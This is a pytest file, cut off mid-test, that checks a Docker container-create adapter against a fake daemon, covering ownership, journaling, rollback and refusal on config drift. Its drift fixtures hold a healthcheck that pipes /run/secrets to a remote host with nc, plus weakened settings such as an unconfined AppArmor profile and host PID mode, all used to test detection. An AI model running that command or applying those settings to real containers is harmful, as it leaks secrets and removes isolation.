"""Fixed Engine-create adapter against a deterministic fake Engine daemon.

No Docker daemon, socket, network or Compose binary is used. These tests prove
code mechanics only; they are not an actual Engine lifecycle qualification.
Includes the regressions for the independent L0 challenger findings F1-F7/N2/N9.
"""
import copy
from datetime import datetime, timezone
import hashlib
import itertools
import json
import os
from pathlib import Path
import re
import stat
import traceback
from types import SimpleNamespace as NS

import httpx
import pytest

from vkm_corpus.update import engine_create as E
from vkm_corpus.update.bootstrap_native import network_fingerprint
from vkm_corpus.update.engine_create import (EngineCreateAdapter, EngineCreatePlan, EngineCreateProfile,
    EngineDaemonPin, EngineComponentPin, EngineLogConfig, EngineMount, EngineNetworkAttachment, EnginePortBinding,
    EngineRestartPolicy, EngineTransport, engine_journal_path)
from vkm_corpus.update.first_live import FirstLiveError, FirstLiveNotReady
from vkm_corpus.update.first_live_native import FirstLiveController, NativeFirstLiveAdapters
from vkm_corpus.update.generation import GenerationUnavailable
from vkm_corpus.update.operator_units import UnitPin, container_fingerprint
from vkm_corpus.update.runtime import BoundFile
from vkm_evidence.contracts import canonical_bytes

SENTINEL = "SENTINEL-SECRET-6f1d0c9e"
IMAGE = "sha256:" + "a" * 64
LEGACY_IMAGE = "sha256:" + "b" * 64
NETWORK_ID = "e" * 64
INTENT_SHA = "d" * 64
ORIGINALS = {"api": "1" * 64, "mcp": "2" * 64}
DAEMON_ID = "WXYZ:ABCD:EFGH:IJKL:MNOP:QRST:UVWX:YZ01:2345:6789:ABCD:EFGH"
VERSION = {"ApiVersion": "1.45", "MinAPIVersion": "1.24", "Version": "27.3.1", "Os": "linux",
           "Components": [{"Name": "Engine", "Version": "27.3.1", "Details": {}},
                          {"Name": "containerd", "Version": "1.7.22"}, {"Name": "runc", "Version": "1.1.14"},
                          {"Name": "docker-init", "Version": "0.19.0"}]}
INFO = {"ID": DAEMON_ID, "DefaultRuntime": "runc", "CgroupDriver": "systemd", "CgroupVersion": "2",
        "SecurityOptions": ["name=apparmor", "name=seccomp,profile=builtin", "name=cgroupns"],
        "DockerRootDir": "/var/lib/docker"}
DAEMON = EngineDaemonPin(daemon_id=DAEMON_ID, engine_version="27.3.1",
    components=tuple(EngineComponentPin(name=c["Name"], version=c["Version"]) for c in VERSION["Components"]),
    default_runtime="runc", security_options=tuple(INFO["SecurityOptions"]), cgroup_driver="systemd",
    cgroup_version="2", docker_root_dir="/var/lib/docker")
NETWORK = {"Id": NETWORK_ID, "Name": "vkm_net", "Driver": "bridge", "Scope": "local", "Internal": False,
           "Attachable": False, "Ingress": False, "EnableIPv6": False, "IPAM": {"Driver": "default", "Config": []},
           "Options": {"com.docker.network.bridge.name": "br-vkm"}, "Labels": {}, "ConfigOnly": False,
           "ConfigFrom": {"Network": ""}}
IMAGE_DOC = {"Id": IMAGE, "Config": {"Env": ["PATH=/usr/local/bin:/usr/bin", "LANG=C.UTF-8"],
             "Labels": {"org.opencontainers.image.version": "1"}, "ExposedPorts": {"9999/tcp": {}},
             "Entrypoint": ["vkm"], "Cmd": ["--help"], "WorkingDir": "/app", "User": "", "Volumes": None,
             "Healthcheck": None}}


def allowed(api="1.44", prefix="vkm-core"):
    v = "/v" + re.escape(api)
    return {"GET": [v + "/version", v + "/info", v + r"/images/sha256:[0-9a-f]{64}/json",
                    v + r"/networks/[0-9a-f]{64}", v + r"/containers/(?:[0-9a-f]{64}|" + prefix + r"-(?:api|mcp)-1)/json"],
            "POST": [v + "/containers/create", v + r"/containers/[0-9a-f]{64}/(?:start|stop)"],
            "DELETE": [v + r"/containers/[0-9a-f]{64}"]}


ALLOWED = allowed()
DEFAULT_ENV = {"api": {"VKM_API_PROFILE": "production", "VKM_DATA_ROLE": "canonical",
                       "VKM_UPDATE_RUNTIME_FILE": "/srv/runtime.json", "VKM_SECRET_PROBE": SENTINEL},
               "mcp": {"VKM_API_URL": "http://api:8000", "VKM_MCP_TOKEN_FILE": "/srv/served/mcp.token",
                       "VKM_SECRET_PROBE": SENTINEL}}


class Crash(BaseException):
    """Process death after an actual (synthetic) effect."""


class Clock:
    def __init__(self):
        self.now = 1_800_000_000.0

    def __call__(self):
        return self.now


def rfc3339(unix):
    return datetime.fromtimestamp(unix, tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f") + "000Z"


class FakeDaemon:
    """Minimal Docker-like semantics for exactly the allowlisted endpoints."""

    def __init__(self, *, api="1.44", prefix="vkm-core"):
        self.allowed = allowed(api, prefix)
        self.containers, self.requests, self.cli_calls, self.bodies = {}, [], [], []
        self.images = {IMAGE: copy.deepcopy(IMAGE_DOC)}
        self.networks = {NETWORK_ID: copy.deepcopy(NETWORK)}
        self.version, self.info = copy.deepcopy(VERSION), copy.deepcopy(INFO)
        self.hooks, self.order, self.late_network_id = {}, "reversed", None
        self.created, self.deleted, self.started = [], [], []
        self.clock = lambda: 1_800_000_000.0
        self._ids = itertools.count(1)

    def transport(self):
        return httpx.MockTransport(self.handle)

    def by_ref(self, ref):
        return next((c for i, c in self.containers.items() if i == ref or c["Name"] == "/" + ref), None)

    def new_id(self):
        return "%064x" % (0xC0FFEE0000 + next(self._ids))

    def _ordered(self, values):
        values = list(values)
        if self.order == "reversed":
            return values[::-1]
        if self.order == "rotated" and values:
            return values[1:] + values[:1]
        return values

    def materialize(self, ident, name, body):
        image = self.images[body["Image"]]["Config"]
        env = dict(x.split("=", 1) for x in image.get("Env") or [])
        env.update(dict(x.split("=", 1) for x in body.get("Env") or []))
        host = copy.deepcopy(body["HostConfig"])
        mounts = host.pop("Mounts")
        host.update({"Mounts": self._ordered([{k: v for k, v in m.items() if not (k == "ReadOnly" and v is False)}
                                              for m in mounts]),
                     "MemorySwap": host.get("MemorySwap", 2 * host["Memory"]), "Binds": None, "Devices": [],
                     "Init": host.get("Init"), "PidsLimit": host.get("PidsLimit"), "CapAdd": host.get("CapAdd") or None,
                     "Runtime": "runc", "Cgroup": "", "CgroupParent": "", "GroupAdd": None, "DeviceRequests": None,
                     "DeviceCgroupRules": None, "OomKillDisable": None, "OomScoreAdj": 0, "Ulimits": None, "Dns": [],
                     "DnsOptions": [], "DnsSearch": [], "ExtraHosts": None, "Links": None, "VolumesFrom": None,
                     "Sysctls": None, "UsernsMode": "", "PidMode": "", "UTSMode": "", "ShmSize": 67108864,
                     "MaskedPaths": sorted(E.BASELINE_MASKED_PATHS | {"/sys/devices/virtual/powercap"}),
                     "ReadonlyPaths": sorted(E.BASELINE_READONLY_PATHS)})
        network = body["HostConfig"]["NetworkMode"]
        aliases = body["NetworkingConfig"]["EndpointsConfig"][network]["Aliases"]
        # Real Engine behaviour (26.1.5): an implicit AppArmor profile appears only at the
        # first start; an explicit apparmor= option is recorded at create.
        explicit = [o.split("=", 1)[1] for o in body["HostConfig"].get("SecurityOpt") or [] if o.startswith("apparmor=")]
        return {"Id": ident, "Name": "/" + name, "Image": body["Image"], "Created": rfc3339(self.clock()),
                "AppArmorProfile": explicit[0] if explicit else "",
                "Config": {"Hostname": ident[:12], "Image": body["Image"], "Cmd": body.get("Cmd") or image.get("Cmd"),
                           "Entrypoint": body.get("Entrypoint", image.get("Entrypoint")),
                           "Env": [k + "=" + v for k, v in env.items()],
                           "Labels": {**(image.get("Labels") or {}), **body.get("Labels", {})},
                           "ExposedPorts": {**(image.get("ExposedPorts") or {}), **body.get("ExposedPorts", {})},
                           "User": body.get("User", image.get("User", "")),
                           "WorkingDir": body.get("WorkingDir", image.get("WorkingDir", "")),
                           "StopSignal": body.get("StopSignal", "SIGTERM"), "Volumes": image.get("Volumes"),
                           "Healthcheck": image.get("Healthcheck"), "Tty": False, "OpenStdin": False},
                "HostConfig": host,
                "Mounts": self._ordered([{"Type": "bind", "Source": m["Source"], "Destination": m["Target"], "Mode": "",
                                          "RW": not m.get("ReadOnly", False), "Propagation": "rprivate"} for m in mounts]),
                "NetworkSettings": {"Networks": {network: {
                    "NetworkID": "" if self.late_network_id else self.network_by_name(network)["Id"],
                    "Aliases": list(aliases) + [ident[:12]], "IPAMConfig": None, "Links": None, "DriverOpts": None,
                    "DNSNames": [name, ident[:12], *aliases]}}, "Ports": {}},
                "State": {"Status": "created", "Running": False, "Paused": False, "Restarting": False, "Pid": 0,
                          "StartedAt": E.DOCKER_ZERO_TIME}}

    def network_by_name(self, name):
        return next(n for n in self.networks.values() if n["Name"] == name)

    def hook(self, name, *args):
        if name in self.hooks:
            return self.hooks[name](*args)

    def handle(self, request):
        path, query = request.url.path, dict(request.url.params)
        self.requests.append((request.method, path, query))
        assert any(re.fullmatch(p, path) for p in self.allowed.get(request.method, ())), (request.method, path)
        part = path.split("/")
        reply = lambda status, value=None: httpx.Response(status, json=value) if value is not None else httpx.Response(status)
        if path.endswith("/version") or path.endswith("/info"):
            assert query == {}
            return reply(200, self.version if path.endswith("/version") else self.info)
        if part[2] == "images":
            assert query == {}
            image = self.images.get(part[3])
            return reply(200, copy.deepcopy(image)) if image else reply(404, {"message": "no such image"})
        if part[2] == "networks":
            network = self.networks.get(part[3])
            return reply(200, copy.deepcopy(network)) if network else reply(404, {"message": "no such network"})
        if path.endswith("/containers/create"):
            assert set(query) == {"name"}
            body = json.loads(request.content)
            self.bodies.append(body)
            override = self.hook("before_create", request, query["name"], body)
            if override is not None:
                return override
            if self.by_ref(query["name"]) is not None:
                return reply(409, {"message": "Conflict. The container name is already in use"})
            if body["Image"] not in self.images:
                return reply(404, {"message": "no such image"})
            ident = self.new_id()
            self.containers[ident] = self.materialize(ident, query["name"], body)
            self.created.append(ident)
            override = self.hook("after_create", request, self.containers[ident])
            return override if override is not None else reply(201, {"Id": ident, "Warnings": []})
        ident = part[3]
        item = self.containers.get(ident)
        if request.method == "GET":
            assert query == {}
            item = self.by_ref(ident)
            if item is None:
                return reply(404, {"message": "no such container"})
            # Objects of other fixtures may carry Python test markers: serialize as on the wire.
            return httpx.Response(200, content=json.dumps(item, default=lambda o: o.model_dump(mode="json")).encode())
        if item is None:
            return reply(404, {"message": "no such container"})
        if path.endswith("/start"):
            assert query == {}
            if item["State"]["Running"]:
                return reply(304)
            item["State"].update(Running=True, Pid=4000 + len(self.started), Status="running",
                                 StartedAt=rfc3339(self.clock()))
            if not item.get("AppArmorProfile") and "name=apparmor" in self.info["SecurityOptions"]:
                item["AppArmorProfile"] = "docker-default"
            if self.late_network_id == "assign-on-start":
                for name, endpoint in item["NetworkSettings"]["Networks"].items():
                    endpoint["NetworkID"] = self.network_by_name(name)["Id"]
            self.started.append(ident)
            self.hook("after_start", request, item)
            return reply(204)
        if path.endswith("/stop"):
            assert set(query) == {"t"} and query["t"].isdigit()
            if not item["State"]["Running"]:
                return reply(304)
            item["State"].update(Running=False, Restarting=False, Pid=0, Status="exited")
            return reply(204)
        assert request.method == "DELETE" and query == {"force": "false", "v": "false"}
        if item["State"]["Running"]:
            return reply(409, {"message": "cannot remove a running container"})
        del self.containers[ident]
        self.deleted.append(ident)
        return reply(204)

    # Fixed legacy docker CLI used only by the existing park/restore of originals.
    def cli(self, kind, argv):
        assert kind == "docker", "Compose must never be called by the first-LIVE path"
        self.cli_calls.append(argv)
        if argv == ("info", "--format", "{{json .ID}}"):
            return canonical_bytes(self.info["ID"])
        if argv[:2] == ("container", "ls"):
            name = argv[4].removeprefix("name=^/").removesuffix("$")
            found = self.by_ref(name)
            return b"" if found is None else canonical_bytes(found["Id"])
        if argv[:3] == ("inspect", "--type", "container"):
            found = self.by_ref(argv[3])
            if found is None:
                raise GenerationUnavailable("no such container")
            return canonical_bytes([copy.deepcopy(found)])
        if argv[0] == "stop":
            self.containers[argv[-1]]["State"].update(Running=False, Pid=0, Status="exited")
        elif argv[0] == "start":
            self.containers[argv[-1]]["State"].update(Running=True, Pid=9000, Status="running")
        elif argv[0] == "rename":
            if self.by_ref(argv[2]) is not None:
                raise GenerationUnavailable("name in use")
            self.containers[argv[1]]["Name"] = "/" + argv[2]
        else:
            raise AssertionError(argv)
        return b""

    def mutations(self):
        return [(m, p, q) for m, p, q in self.requests if m != "GET"]

    def creates(self):
        return [r for r in self.requests if r[0] == "POST" and r[1].endswith("/create")]


def legacy_doc(unit, ident):
    port, host_port = ("8000", "18000") if unit == "api" else ("8765", "18765")
    return {"Id": ident, "Name": "/vkm-core-" + unit + "-1", "Image": LEGACY_IMAGE,
            "Config": {"Hostname": ident[:12], "Image": "vkm/core@" + LEGACY_IMAGE, "Cmd": [unit, "serve"],
                       "Env": ["LEGACY=1"], "Labels": {"com.docker.compose.project": "vkm-core",
                       "com.docker.compose.service": unit, "com.docker.compose.container-number": "1",
                       "com.docker.compose.config-hash": "legacy"}},
            "HostConfig": {"NetworkMode": "vkm_net", "PortBindings": {port + "/tcp": [{"HostIp": "127.0.0.1", "HostPort": host_port}]}},
            "Mounts": [], "NetworkSettings": {"Networks": {"vkm_net": {"NetworkID": NETWORK_ID, "Aliases": [unit]}}},
            "State": {"Running": True, "Paused": False, "Pid": 1234, "Status": "running", "StartedAt": "2026-10-01T00:00:00Z"},
            "unique_layer": "DO_NOT_LOSE_" + unit}


def authority_of(root):
    return Path(root).parent.parent / "authority"


def env_file(root, unit, values):
    """Authority-root Env file (never under the control root); returns its BoundFile."""
    data = canonical_bytes(values)
    path = authority_of(root) / (unit + "-" + hashlib.sha256(data).hexdigest()[:12] + ".engine-env.json")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    path.chmod(0o600)
    return BoundFile(path=str(path), sha256=hashlib.sha256(data).hexdigest())


def profile(unit, root, *, env=None, family="PRODUCTION", **update):
    port, host_port = (8000, 18000) if unit == "api" else (8765, 18765)
    env_values = DEFAULT_ENV[unit] if env is None else env
    data = Path(root).parent / "data"
    values = dict(unit=unit, name=E.owned_name(family, unit), image=IMAGE,
        cmd=(unit, "serve", "--host", "0.0.0.0", "--port", str(port)),
        env_names=tuple(sorted(env_values)), environment=env_file(root, unit, env_values),
        user="10001:10001", labels={"org.example.role": "receiver"}, exposed_ports=(str(port) + "/tcp",),
        mounts=(EngineMount(source=str(root), target="/srv/served", read_only=True),
                EngineMount(source=str(Path(root) / "admission.lock"), target="/srv/served/admission.lock", read_only=False),
                EngineMount(source=str(data), target="/data", read_only=True)),
        tmpfs={"/tmp": "rw,noexec,nosuid,size=64m"},
        port_bindings=(EnginePortBinding(container_port=port, host_ip="127.0.0.1", host_port=host_port),),
        network=EngineNetworkAttachment(name="vkm_net", network_id=NETWORK_ID,
                                        config_sha256=network_fingerprint(NETWORK), aliases=(unit,)),
        security_opt=("no-new-privileges:true",), memory_bytes=2 * 1024**3, nano_cpus=2_000_000_000,
        pids_limit=512, init=True, log_config=EngineLogConfig(type="json-file", config={"max-size": "10m"}))
    values.update(update)
    return EngineCreateProfile(**values)


def make_plan(root, *, daemon=DAEMON, family="PRODUCTION", **update):
    return EngineCreatePlan(api_version="1.44", daemon=daemon, name_family=family,
                            profiles={u: profile(u, root, family=family, **update) for u in ("api", "mcp")})


@pytest.fixture
def world(tmp_path):
    root = tmp_path / "runtime" / "served"
    root.mkdir(parents=True)
    (root / "admission.lock").touch()
    (root.parent / "data").mkdir()
    daemon, clock = FakeDaemon(), Clock()
    daemon.clock = clock
    plan = make_plan(root)
    journal = engine_journal_path(str(root), INTENT_SHA)

    def adapter(*, plan=plan, fault=None, preserved=tuple(ORIGINALS.values()), intent=INTENT_SHA, monotonic=None,
                socket=E.ENGINE_SOCKET, journal_path=journal):
        extra = {} if monotonic is None else {"_monotonic": monotonic}
        return EngineCreateAdapter(plan, journal_path=journal_path, intent_sha256=intent, preserved_ids=preserved,
                                   transport=daemon.transport(), clock=clock, _fault=fault, socket_path=socket, **extra)
    return NS(root=root, daemon=daemon, clock=clock, plan=plan, journal=journal, adapter=adapter, tmp=tmp_path)


def crash_at(phase, occurrence=1):
    seen = []

    def fault(value):
        if value == phase:
            seen.append(value)
            if len(seen) == occurrence:
                raise Crash(phase)
    return fault


def phases(path):
    return [json.loads(line)["phase"] for line in Path(path).read_bytes().splitlines()]


def records(path):
    return [json.loads(line) for line in Path(path).read_bytes().splitlines()]


# ---------------------------------------------------------------- happy path --

def test_create_body_is_built_from_profile_and_resolved_env_only(world):
    engine = world.adapter()
    ids = {u: engine.create(u) for u in ("api", "mcp")}
    assert engine.start("api") == ids["api"]
    creates = world.daemon.creates()
    assert [q["name"] for _, _, q in creates] == ["vkm-core-api-1", "vkm-core-mcp-1"]
    for unit, body in zip(("api", "mcp"), world.daemon.bodies):
        profile_ = world.plan.profiles[unit]
        owned = E.ownership_labels(engine.attempt_id(1), unit, profile_.sha256)
        assert body == E.create_body(profile_, owned, DEFAULT_ENV[unit])
        assert set(body) <= {"Image", "Cmd", "Env", "Labels", "ExposedPorts", "User", "AttachStdin", "AttachStdout",
                             "AttachStderr", "Tty", "OpenStdin", "StdinOnce", "HostConfig", "NetworkingConfig"}
        assert body["Image"] == IMAGE and body["HostConfig"]["NetworkMode"] == "vkm_net"
        assert body["HostConfig"]["RestartPolicy"] == {"Name": "no", "MaximumRetryCount": 0}
        assert body["HostConfig"]["IpcMode"] == body["HostConfig"]["CgroupnsMode"] == "private"
        assert [m["Target"] for m in body["HostConfig"]["Mounts"]] == [m.target for m in profile_.mounts]
    for unit, ident in ids.items():
        doc = world.daemon.containers[ident]
        labels = doc["Config"]["Labels"]
        assert not any(k.startswith("com.docker.compose.") for k in labels)
        assert labels[E.LABEL_ATTEMPT] == engine.attempt_id(1) and labels[E.LABEL_UNIT] == unit
        assert labels[E.LABEL_PROFILE] == world.plan.profiles[unit].sha256
        assert doc["HostConfig"]["Privileged"] is False and doc["HostConfig"]["PublishAllPorts"] is False
    assert world.daemon.containers[ids["api"]]["State"]["Running"] is True
    assert world.daemon.containers[ids["mcp"]]["State"]["Running"] is False
    assert phases(world.journal) == ["JOURNAL_OPEN", "ATTEMPT_OPEN", "CREATE_INTENT", "CREATE_ACK", "POST_CREATE_VERIFIED",
        "CREATE_INTENT", "CREATE_ACK", "POST_CREATE_VERIFIED", "START_INTENT", "STARTED"]


@pytest.mark.parametrize("order", ["same", "reversed", "rotated"])
def test_mount_order_is_compared_as_a_set_never_as_an_ordered_list(world, order):
    world.daemon.order = order
    engine = world.adapter()
    ident = engine.create("api")
    doc = world.daemon.containers[ident]
    targets = [m["Destination"] for m in doc["Mounts"]]
    assert targets == {"same": ["/srv/served", "/srv/served/admission.lock", "/data"],
                       "reversed": ["/data", "/srv/served/admission.lock", "/srv/served"],
                       "rotated": ["/srv/served/admission.lock", "/data", "/srv/served"]}[order]
    assert engine.start("api") == ident


@pytest.mark.parametrize("late", ["assign-on-start", "never-assigned"])
def test_endpoint_network_id_may_be_unset_before_start_but_must_match_once_running(world, late):
    world.daemon.late_network_id = late
    engine = world.adapter()
    ident = engine.create("api")
    assert engine.observe("api", running=False)[1] == engine.expected_pin("api")
    if late == "assign-on-start":
        assert engine.start("api") == ident and phases(world.journal)[-1] == "STARTED"
    else:
        with pytest.raises(E.EngineContractDrift):
            engine.start("api")
        assert phases(world.journal)[-2:] == ["START_INTENT", "VERIFY_FAILED"] and engine.current("api") is None
        with pytest.raises(E.EngineOwnershipError):
            world.adapter().start("api")  # a resumed process cannot bless the drifted running candidate
        assert engine.remove_owned() == [ident] and world.daemon.started == [ident]


def test_journal_requires_an_existing_control_root(world, tmp_path):
    engine = world.adapter(journal_path=tmp_path / "absent-root" / "first-live-engine" / "j.jsonl")
    with pytest.raises(E.EngineJournalError):
        engine.create("api")
    assert world.daemon.mutations() == [] and not (tmp_path / "absent-root").exists()


def test_image_defaults_and_short_id_alias_are_not_mistaken_for_drift(world):
    engine = world.adapter()
    ident = engine.create("mcp")
    doc = world.daemon.containers[ident]
    assert "LANG=C.UTF-8" in doc["Config"]["Env"] and "9999/tcp" in doc["Config"]["ExposedPorts"]
    assert ident[:12] in doc["NetworkSettings"]["Networks"]["vkm_net"]["Aliases"]
    assert engine.observe("mcp", running=False)[1] == engine.expected_pin("mcp")


# ------------------------------------------------------ foreign / ownership --

@pytest.mark.parametrize("kind", ["unlabelled", "compose-original", "other-profile", "other-journal"])
def test_foreign_same_name_container_is_refused_and_never_touched(world, kind):
    engine = world.adapter()
    foreign = legacy_doc("api", "9" * 64)
    labels = foreign["Config"]["Labels"]
    if kind == "unlabelled":
        labels.clear()
    elif kind == "other-profile":
        labels.clear()
        labels.update({E.LABEL_ATTEMPT: engine.attempt_id(1), E.LABEL_UNIT: "api", E.LABEL_PROFILE: "f" * 64})
    elif kind == "other-journal":
        labels.clear()
        labels.update({E.LABEL_ATTEMPT: "0" * 32 + ".1", E.LABEL_UNIT: "api",
                       E.LABEL_PROFILE: world.plan.profiles["api"].sha256})
    world.daemon.containers[foreign["Id"]] = foreign
    before = copy.deepcopy(foreign)
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")
    assert world.daemon.creates() == [] and world.daemon.mutations() == []
    assert world.daemon.containers[foreign["Id"]] == before
    assert "CREATE_INTENT" not in phases(world.journal) and "OCCUPANT_OWNED" not in phases(world.journal)
    if kind == "other-profile":
        # Claims this journal's identity without a recorded intent: never owned, rollback fails closed.
        with pytest.raises(E.EngineCreateAmbiguous):
            engine.remove_owned()
        assert phases(world.journal)[-1] == "ATTEMPT_OPEN"
    else:
        assert engine.remove_owned() == []
    assert world.daemon.mutations() == [] and world.daemon.containers[foreign["Id"]] == before


def test_renamed_original_with_previous_compose_labels_is_never_selected_or_removed(world):
    engine = world.adapter()
    for unit, ident in ORIGINALS.items():
        doc = legacy_doc(unit, ident)
        doc["Name"] = "/vkm-first-live-retained-0123456789abcdef0123-" + unit
        doc["State"].update(Running=False, Pid=0)
        world.daemon.containers[ident] = doc
    originals = copy.deepcopy({i: world.daemon.containers[i] for i in ORIGINALS.values()})
    ids = {u: engine.create(u) for u in ("api", "mcp")}
    engine.start("api")
    assert sorted(engine.remove_owned()) == sorted(ids.values())
    assert sorted(world.daemon.deleted) == sorted(ids.values())
    assert {i: world.daemon.containers[i] for i in ORIGINALS.values()} == originals
    assert not any(ORIGINALS[u] in p for u in ORIGINALS for _, p, _ in world.daemon.mutations())


def test_journal_claiming_a_preserved_original_refuses_before_any_effect(world):
    engine = world.adapter()
    world.daemon.containers[ORIGINALS["api"]] = legacy_doc("api", ORIGINALS["api"])
    engine.journal.append("ATTEMPT_OPEN", attempt=1)
    engine.journal.append("CREATE_INTENT", attempt=1, unit="api", owned_name="vkm-core-api-1",
        profile_sha256=world.plan.profiles["api"].sha256, preserved_ids=sorted(ORIGINALS.values()),
        deadline_unix=0.0, ordinal=1)
    engine.journal.append("CREATE_ACK", attempt=1, unit="api", container_id=ORIGINALS["api"],
        profile_sha256=world.plan.profiles["api"].sha256)
    with pytest.raises(E.EngineOwnershipError, match="preserved"):
        engine.remove_owned()
    assert world.daemon.requests == [] and ORIGINALS["api"] in world.daemon.containers


def test_create_answer_with_a_preserved_identity_is_never_owned(world):
    def answer(request, doc):
        return httpx.Response(201, json={"Id": ORIGINALS["api"], "Warnings": []})
    world.daemon.hooks["after_create"] = answer
    engine = world.adapter()
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")
    assert "CREATE_ACK" not in phases(world.journal)


# ------------------------------------------------------------------- drift --

def drift(kind):
    def mutate(request, doc):
        if kind == "env":
            doc["Config"]["Env"] = [x for x in doc["Config"]["Env"] if not x.startswith("VKM_API_PROFILE=")] + ["VKM_API_PROFILE=dev"]
        elif kind == "env-extra":
            doc["Config"]["Env"].append("VKM_DEBUG=1")
        elif kind == "mount":
            doc["Mounts"] = [dict(m, RW=True) for m in doc["Mounts"]]
        elif kind == "hostconfig-mount":
            doc["HostConfig"]["Mounts"] = doc["HostConfig"]["Mounts"][1:]
        elif kind == "compose-label":
            doc["Config"]["Labels"]["com.docker.compose.project"] = "vkm-core"
        elif kind == "alias":
            doc["NetworkSettings"]["Networks"]["vkm_net"]["Aliases"] = ["other"]
        elif kind == "anonymous-volume":
            doc["Mounts"].append({"Type": "volume", "Source": "/var/lib/docker/volumes/x/_data", "Destination": "/cache", "RW": True})
        elif kind == "image":
            doc["Image"] = "sha256:" + "c" * 64
        elif kind == "port":
            doc["HostConfig"]["PortBindings"] = {"8000/tcp": [{"HostIp": "0.0.0.0", "HostPort": "18000"}]}
        elif kind == "privileged":
            doc["HostConfig"]["Privileged"] = True
        elif kind == "network":
            doc["NetworkSettings"]["Networks"]["vkm_net"]["NetworkID"] = "f" * 64
        elif kind == "user":
            doc["Config"]["User"] = "0:0"
        elif kind == "restart":
            doc["HostConfig"]["RestartPolicy"] = {"Name": "always", "MaximumRetryCount": 0}
    return mutate


# Challenger F3: security-relevant fields that must be part of the native contract.
UNOBSERVED = [
    ("HostConfig", "Runtime", "nvidia"),
    ("HostConfig", "CgroupnsMode", "host"),
    ("HostConfig", "MaskedPaths", []),
    ("HostConfig", "ReadonlyPaths", []),
    ("HostConfig", "GroupAdd", ["0", "docker"]),
    ("HostConfig", "DeviceRequests", [{"Driver": "nvidia", "Count": -1, "Capabilities": [["gpu"]]}]),
    ("HostConfig", "DeviceCgroupRules", ["a *:* rwm"]),
    ("HostConfig", "CgroupParent", "/attacker.slice"),
    ("HostConfig", "OomKillDisable", True),
    ("HostConfig", "Ulimits", [{"Name": "nofile", "Soft": 1048576, "Hard": 1048576}]),
    ("HostConfig", "IpcMode", "shareable"),
    ("HostConfig", "LogConfig", {"Type": "syslog", "Config": {"syslog-address": "udp://203.0.113.9:514"}}),
    ("HostConfig", "Dns", ["203.0.113.53"]),
    ("HostConfig", "Sysctls", {"net.ipv4.ip_unprivileged_port_start": "0"}),
    ("HostConfig", "PidMode", "host"),
    ("Config", "Healthcheck", {"Test": ["CMD", "/bin/sh", "-c", "cat /run/secrets/x | nc 203.0.113.9 1"]}),
    ("Config", "Tty", True),
    (None, "AppArmorProfile", "unconfined"),
    ("endpoint", "IPAMConfig", {"IPv4Address": "172.20.30.33"}),
]


def unobserved(section, key, value):
    def mutate(request, doc):
        if section == "endpoint":
            doc["NetworkSettings"]["Networks"]["vkm_net"][key] = value
        else:
            (doc if section is None else doc[section])[key] = value
    return mutate


DRIFTS = [(k, drift(k)) for k in ("env", "env-extra", "mount", "hostconfig-mount", "compose-label", "alias",
          "anonymous-volume", "image", "port", "privileged", "network", "user", "restart")] + [
          (key, unobserved(section, key, value)) for section, key, value in UNOBSERVED]


@pytest.mark.parametrize("kind,mutate", DRIFTS, ids=[k for k, _ in DRIFTS])
def test_post_create_config_drift_refuses_before_start_and_rolls_back_only_owned(world, kind, mutate):
    world.daemon.hooks["after_create"] = mutate
    for unit, ident in ORIGINALS.items():
        world.daemon.containers[ident] = dict(legacy_doc(unit, ident), Name="/parked-" + unit)
    engine = world.adapter()
    with pytest.raises(E.EngineContractDrift):
        engine.create("api")
    with pytest.raises(E.EngineOwnershipError):
        engine.start("api")
    assert world.daemon.started == [] and "VERIFY_FAILED" in phases(world.journal)
    with pytest.raises(E.EngineOwnershipError):
        engine.create("api")  # an owned drifted candidate only allows rollback
    if kind == "compose-label":
        # A candidate that Compose could adopt no longer proves attempt ownership: fail closed, keep it.
        with pytest.raises(E.EngineOwnershipError):
            engine.remove_owned()
        assert world.daemon.deleted == []
    else:
        assert engine.remove_owned() == world.daemon.created == world.daemon.deleted
    assert all(i in world.daemon.containers for i in ORIGINALS.values())


def test_lost_ack_never_adopts_an_attempt_container_with_unobserved_weakening(world):
    def forged(request, doc):
        doc["HostConfig"].update(Runtime="runc-unsafe", MaskedPaths=[], CgroupnsMode="host")
        doc["AppArmorProfile"] = "unconfined"
        raise httpx.ReadTimeout("lost", request=request)
    world.daemon.hooks["after_create"] = forged
    engine = world.adapter()
    with pytest.raises(E.EngineContractDrift):
        engine.create("api")
    assert phases(world.journal)[-1] == "CREATE_PARTIAL"
    with pytest.raises(E.EngineOwnershipError):
        engine.start("api")
    assert world.daemon.started == [] and engine.remove_owned() == world.daemon.created == world.daemon.deleted


@pytest.mark.parametrize("kind", ["image-missing", "image-other", "image-volume", "network-missing", "network-config",
                                  "network-name", "daemon-old", "daemon-api", "daemon-os", "daemon-patch",
                                  "daemon-components", "daemon-id", "daemon-runtime", "daemon-secopts",
                                  "daemon-cgroup", "daemon-root"])
def test_image_network_and_daemon_drift_refuse_before_create(world, kind):
    d = world.daemon
    if kind == "image-missing": d.images.clear()
    elif kind == "image-other": d.images[IMAGE]["Id"] = "sha256:" + "c" * 64
    elif kind == "image-volume": d.images[IMAGE]["Config"]["Volumes"] = {"/cache": {}}
    elif kind == "network-missing": d.networks.clear()
    elif kind == "network-config": d.networks[NETWORK_ID]["Options"]["com.docker.network.bridge.name"] = "br-other"
    elif kind == "network-name": d.networks[NETWORK_ID]["Name"] = "other"
    elif kind == "daemon-old": d.version["Version"] = "24.0.9"
    elif kind == "daemon-api": d.version["ApiVersion"] = "1.43"
    elif kind == "daemon-os": d.version["Os"] = "windows"
    elif kind == "daemon-patch": d.version["Version"] = "27.3.2"
    elif kind == "daemon-components": d.version["Components"][2]["Version"] = "1.1.15"
    elif kind == "daemon-id": d.info["ID"] = "OTHER:DAEMON:IDENTITY"
    elif kind == "daemon-runtime": d.info["DefaultRuntime"] = "nvidia"
    elif kind == "daemon-secopts": d.info["SecurityOptions"] = ["name=seccomp,profile=unconfined"]
    elif kind == "daemon-cgroup": d.info["CgroupVersion"] = "1"
    else: d.info["DockerRootDir"] = "/srv/docker"
    with pytest.raises((E.EngineContractDrift, E.EngineUnavailable)):
        world.adapter().create("api")
    assert d.mutations() == [] and not Path(world.journal).exists()


@pytest.mark.parametrize("kind", ["memory", "network-config", "image-gone", "started-outside", "env-file", "daemon-id"])
def test_drift_between_verification_and_start_never_starts(world, kind):
    engine = world.adapter()
    ident = engine.create("api")
    if kind == "memory":
        world.daemon.containers[ident]["HostConfig"]["Memory"] = 1
